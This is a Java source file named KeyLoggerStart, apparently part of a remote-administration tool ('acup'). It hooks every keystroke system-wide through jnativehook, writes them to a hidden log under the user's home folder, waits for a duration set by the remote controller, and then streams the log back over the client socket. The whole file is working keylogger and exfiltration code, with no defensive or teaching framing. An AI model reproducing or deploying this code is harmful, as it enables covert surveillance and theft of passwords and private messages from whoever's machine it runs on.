package ainaa.acup.execution;


import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Date;

import org.apache.commons.lang3.exception.ExceptionUtils;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import ainaa.acup.server.ClientThread;
import ainaa.acup.util.Log;

public class KeyLoggerStart implements Runnable{

	private File file = null;
	private KeyLogger keyLogger;
	private Integer time = 60 * 60 * 1000;
	private boolean isForDownload;
	private String mode;
	protected Integer minutes;
	protected Integer hours;
	private String date;
	
	
	public KeyLoggerStart() throws IOException {
		date = new Date().toString();
		
		file = new File(System.getProperty("user.home")+File.separator+"acup"+File.separator+"keyLogger"+File.separator+date+".txt");
		if(!file.exists());
			file.createNewFile();
	}
	@Override
	public void run() {
		try {
			
			mode = (String) ClientThread.objectIn.readObject();
		
		if(mode.equalsIgnoreCase("keylogger_no"))
		{
			isForDownload = false;
		}
		else
		{
			isForDownload = true;
			String timeString = (String) ClientThread.objectIn.readObject();
			String[] times = timeString.split("_");
			hours = Integer.parseInt(times[0]);
			minutes = Integer.parseInt(times[1]);
			time = ((hours * 60 * 60) + (minutes * 60)) *1000;
			System.out.println("sleep time for key" + time);
			
		}
		} catch (ClassNotFoundException | IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		 try {
			 keyLogger = new KeyLogger(file ,date);
             GlobalScreen.registerNativeHook();
             
     }
     catch (NativeHookException ex) {
             System.err.println("There was a problem registering the native hook.");
             System.err.println(ex.getMessage());
             System.exit(1);
     } catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

     //Construct the example object and initialze native hook.
     GlobalScreen.getInstance().addNativeKeyListener(keyLogger);
		try {
			Thread.sleep(time);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().removeNativeKeyListener(keyLogger);
		
		if(isForDownload)
		{
			try {
				int bytecount = 2048;
	            byte[] buf = new byte[bytecount];

	            OutputStream OUT = ClientThread.socket.getOutputStream();
	            BufferedOutputStream BuffOUT = new BufferedOutputStream(OUT, bytecount);
	            FileInputStream in = new FileInputStream(file);

	            int i = 0;
	            while ((i = in.read(buf, 0, bytecount)) != -1) {
	                BuffOUT.write(buf, 0, i);
	                BuffOUT.flush();
	            }
	        if(null != BuffOUT)
	        {
	        	BuffOUT.close();
	        	OUT.close();
	        }
			} catch (IOException e) {
				// TODO Auto-generated catch block
				Log.set("An exception occured !!!"+ExceptionUtils.getStackTrace(e));
			}
		}
	}
	
}